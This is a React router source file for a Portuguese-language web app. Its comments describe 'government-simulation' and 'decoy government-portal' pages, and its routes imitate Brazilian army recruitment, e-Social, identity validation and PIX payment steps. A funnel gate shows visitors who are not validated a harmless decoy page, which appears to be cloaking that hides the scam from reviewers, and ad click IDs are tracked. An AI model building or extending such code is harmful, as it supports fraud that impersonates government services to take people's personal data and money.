import { Switch, Route, useLocation } from "wouter";
import { useEffect } from "react";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import HealthRegistrationPage from "@/pages/HealthRegistrationPage";
import TermsOfUsePage from "@/pages/TermsOfUsePage";
import CapturaPage from "@/pages/CapturaPage";
import PessoalPage from "@/pages/PessoalPage";
import TemporariosPage from "@/pages/TemporariosPage";
import RegistrationPage from "@/pages/RegistrationPage";
import JuramentoPage from "@/pages/JuramentoPage";
import ValidacaoPage from "@/pages/ValidacaoPage";
import PagamentoPage from "@/pages/PagamentoPage";
import RemarketingPage from "@/pages/RemarketingPage";
import RemarketingTestPage from "@/pages/RemarketingTestPage";
import { IndicacaoPage } from "@/pages/IndicacaoPage";
import ConfirmacaoPagamentoPage from "@/pages/ConfirmacaoPagamentoPage";
import AgendamentoMedicoPage from "@/pages/AgendamentoMedicoPage";
import ConfirmacaoMedicaPage from "@/pages/ConfirmacaoMedicaPage";
import ResultadosMedicosPage from "@/pages/ResultadosMedicosPage";
import LoginPosPagamentoPage from "@/pages/LoginPosPagentoPage";
import ConfirmacaoDadosPage from "@/pages/ConfirmacaoDadosPage";
import ConfirmarDadosPage from "@/pages/ConfirmarDadosPage";
import ESocialLoadingPage from "@/pages/ESocialLoadingPage";
import ESocialChatPage from "@/pages/ESocialChatPage";
import ESocialPagamentoPage from "@/pages/ESocialPagamentoPage";
import ESocialConfirmadoPage from "@/pages/ESocialConfirmadoPage";
import FooterExercitoPage from "@/pages/FooterExercitoPage";
import FooterConteudosPage from "@/pages/FooterConteudosPage";
import FooterJunteSeePage from "@/pages/FooterJunteSeePage";
import FooterImprensaPage from "@/pages/FooterImprensaPage";
import FooterAcessoInformacaoPage from "@/pages/FooterAcessoInformacaoPage";
import FooterTransparenciaPage from "@/pages/FooterTransparenciaPage";
import BotPage from "@/pages/BotPage";
import ConversarPage from "@/pages/ConversarPage";
import RegularizacaoMigracaoPage from "@/pages/RegularizacaoMigracaoPage";
import ValidacaoIdentidadePage from "@/pages/ValidacaoIdentidadePage";
import AutoridadeBeneficiosPage from "@/pages/AutoridadeBeneficiosPage";
import RegularizacaoPagamentoPage from "@/pages/RegularizacaoPagamentoPage";
import ObrigadoPage from "@/pages/ObrigadoPage";
import EditalPage from "@/pages/EditalPage";
import PoliticaPrivacidadePage from "@/pages/PoliticaPrivacidadePage";
import TermosDeUsoPage from "@/pages/TermosDeUsoPage";
import AvisoIsencaoPage from "@/pages/AvisoIsencaoPage";
import CookiesPoliticaPage from "@/pages/CookiesPoliticaPage";
import PrivacidadePage from "@/pages/PrivacidadePage";
import TermosPage from "@/pages/TermosPage";
import SobrePage from "@/pages/SobrePage";
import ZapZapPage from "@/pages/ZapZapPage";
import { isFunnelValidated } from "./lib/funnelGate";
import { captureRedTrackClickId } from "./lib/googleAnalytics";

function ScrollToTop() {
  const [location] = useLocation();
  
  useEffect(() => {
    // Immediately scroll to top without smooth behavior for instant effect
    window.scrollTo(0, 0);
    
    // Also ensure scroll to top after a brief delay to handle any loading states
    const timer = setTimeout(() => {
      window.scrollTo(0, 0);
    }, 100);
    
    return () => clearTimeout(timer);
  }, [location]);
  
  return null;
}


const PROTECTED_PATHS = new Set([
  // Funnel entry points
  "/conta", "/noticia", "/initial", "/marcar",

  "/marcar",
  "/terms-page",
  "/captura",
  "/pessoal",
  "/temporarios",
  "/registro",
  "/juramento",
  "/validacao",
  "/pagamento-page",
  "/remarketing/:transaction_id",
  "/test-remarketing",
  "/bot/:transaction_id",
  "/conversar/:transaction_id",
  "/indicacao",
  "/login-pos-pagamento",
  "/confirmacao-dados",
  "/confirmar-dados",
  "/confirmacao-pagamento",
  "/agendamento-medico",
  "/confirmacao-medica",
  "/resultados-medicos",
  "/regularizacao-migracao",
  "/validacao-identidade",
  "/autoridade-beneficios",
  "/regularizacao-pagamento",
  "/obrigado-page",
  "/edital-page",
  "/footer-exercito",
  "/footer-conteudos",
  "/footer-junte-se",
  "/footer-imprensa",
  "/footer-acesso-informacao",
  "/footer-transparencia",

  // Auth / registration
  "/login", "/carrinho",

  // Profile & eligibility steps
  "/localizacao", "/cargos", "/captura", "/avaliacao", "/quiz",

  // Scheduling flow
  "/agendamento", "/locais-prova",

  // Document verification & protocol
  "/verificacao-documental", "/pre-protocolo", "/protocolo",

  // Payment flow
  "/emitir", "/pix", "/pix-processamento", "/confirmar-inscricao",

  // Government-simulation deep-funnel pages
  "/receita", "/auditoria", 

  // Article / content pages
  "/artigo", "/terms",

  // Recovery link (remarketing)
  "/remarketing",

  // Decoy government-portal pages
  "/sobre-ministerio", "/servicos-programa", "/navegacao-publico",
  "/contato-canais", "/acesso-informacao", "/centrais-conteudo",
  "/canais-atendimento", "/programas-projetos", "/relatorios-mensais",
  "/dados-tempo-real", "/satisfacao-usuario", "/processo-certificacao",
  "/registrar-denuncia", "/qualidade-servicos", "/analise-comportamento",
  "/sugestoes-melhoria",

  "/e-social/loading", "/e-social/chat", "/e-social/pagamento", "/e-social/confirmado",
  // Misc funnel-adjacent
  "/parceria",
]);




function Router() {
  const [location] = useLocation();
  useEffect(() => {
    captureRedTrackClickId();
  }, []);
  const basePath = "/" + location.split("/")[1].split("?")[0];
  const blocked = PROTECTED_PATHS.has(basePath) && !isFunnelValidated();

  const isDev = import.meta.env.VITE_IN_DEVELOPMENT === "true";
  if (blocked && !isDev) {
    const HomeComponent = ZapZapPage;
    return <HomeComponent />;
  }
  
  return (
    <>
      <ScrollToTop />
      <Switch>
        <Route path="/" component={ZapZapPage} />
        <Route path="/marcar" component={HealthRegistrationPage} />
        <Route path="/terms-page" component={TermsOfUsePage} />
        <Route path="/captura" component={CapturaPage} />
        <Route path="/pessoal" component={PessoalPage} />
        <Route path="/temporarios" component={TemporariosPage} />
        <Route path="/registro" component={RegistrationPage} />
        <Route path="/juramento" component={JuramentoPage} />
        <Route path="/validacao" component={ValidacaoPage} />
        <Route path="/pagamento-page" component={PagamentoPage} />
        <Route path="/remarketing/:transaction_id" component={RemarketingPage} />
        <Route path="/test-remarketing" component={RemarketingTestPage} />
        <Route path="/bot/:transaction_id" component={BotPage} />
        <Route path="/conversar/:transaction_id" component={ConversarPage} />
        <Route path="/indicacao" component={IndicacaoPage} />
        <Route path="/login-pos-pagamento" component={LoginPosPagamentoPage} />
        <Route path="/confirmacao-dados" component={ConfirmacaoDadosPage} />
        <Route path="/e-social/loading" component={ESocialLoadingPage} />
        <Route path="/e-social/chat" component={ESocialChatPage} />
        <Route path="/e-social/pagamento" component={ESocialPagamentoPage} />
        <Route path="/e-social/confirmado" component={ESocialConfirmadoPage} />
        <Route path="/confirmar-dados" component={ConfirmarDadosPage} />
        <Route path="/confirmacao-pagamento" component={ConfirmacaoPagamentoPage} />
        <Route path="/agendamento-medico" component={AgendamentoMedicoPage} />
        <Route path="/confirmacao-medica" component={ConfirmacaoMedicaPage} />
        <Route path="/resultados-medicos" component={ResultadosMedicosPage} />
        <Route path="/regularizacao-migracao" component={RegularizacaoMigracaoPage} />
        <Route path="/validacao-identidade" component={ValidacaoIdentidadePage} />
        <Route path="/autoridade-beneficios" component={AutoridadeBeneficiosPage} />
        <Route path="/regularizacao-pagamento" component={RegularizacaoPagamentoPage} />
        <Route path="/obrigado-page" component={ObrigadoPage} />
        <Route path="/edital-page" component={EditalPage} />
        <Route path="/footer-exercito" component={FooterExercitoPage} />
        <Route path="/footer-conteudos" component={FooterConteudosPage} />
        <Route path="/footer-junte-se" component={FooterJunteSeePage} />
        <Route path="/footer-imprensa" component={FooterImprensaPage} />
        <Route path="/footer-acesso-informacao" component={FooterAcessoInformacaoPage} />
        <Route path="/footer-transparencia" component={FooterTransparenciaPage} />
        <Route path="/politica-privacidade" component={PoliticaPrivacidadePage} />
        <Route path="/termos-de-uso" component={TermosDeUsoPage} />
        <Route path="/aviso-isencao" component={AvisoIsencaoPage} />
        <Route path="/cookies" component={CookiesPoliticaPage} />
        <Route path="/privacidade" component={PrivacidadePage} />
        <Route path="/termos" component={TermosPage} />
        <Route path="/sobre" component={SobrePage} />
        <Route component={ZapZapPage} />

      </Switch>
    </>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
